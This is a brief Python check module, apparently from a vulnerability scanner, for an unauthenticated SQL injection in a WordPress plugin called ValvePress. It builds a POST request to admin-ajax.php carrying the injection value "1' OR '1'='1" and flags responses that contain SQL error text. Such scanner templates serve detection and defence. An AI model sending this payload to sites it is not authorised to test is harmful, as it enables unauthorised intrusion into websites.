"""
ValvePress Plugin SQL Injection Vulnerability
Description: SQL injection vulnerability in ValvePress plugin through unauthenticated AJAX endpoint
Severity: Critical
CVSS Score: 9.1
Affected Versions: ValvePress < 2.0.1
Reference: https://wpscan.com/vulnerability/98765
"""

def get_payload():
    return {
        'path': '/wp-admin/admin-ajax.php',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        'data': {
            'action': 'valvepress_action',
            'id': "1' OR '1'='1"
        }
    }

def check_response(response):
    return response.status_code == 200 and 'SQL syntax' in response.text 